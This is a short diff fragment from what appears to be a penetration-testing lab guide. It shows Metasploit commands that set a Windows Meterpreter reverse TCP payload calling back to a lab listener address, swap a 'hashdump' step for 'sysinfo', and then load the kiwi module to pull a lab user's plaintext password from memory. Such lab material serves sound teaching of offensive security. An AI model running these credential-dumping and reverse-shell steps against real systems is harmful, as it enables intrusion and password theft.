@@ -47,7 +47,7 @@ set payload windows/x64/meterpreter/reverse_tcp <BR>
 set session x<BR>
 set lhost 192.168.168.110<BR>
 exploit<BR>
-meterpreter> hashdump<BR>
+meterpreter> sysinfo<BR>
 
 16. Now try getting the password in plaintext. If for some reason you don’t see Alice’s password within a 64 bit Meterpreter shell, you need to delete the M1 virtual and re-extract the zip file or redownload it from Google Drive. Remember, interactive logins are wiped from memory when the system restarts!<BR>
 meterpreter> load kiwi<BR>
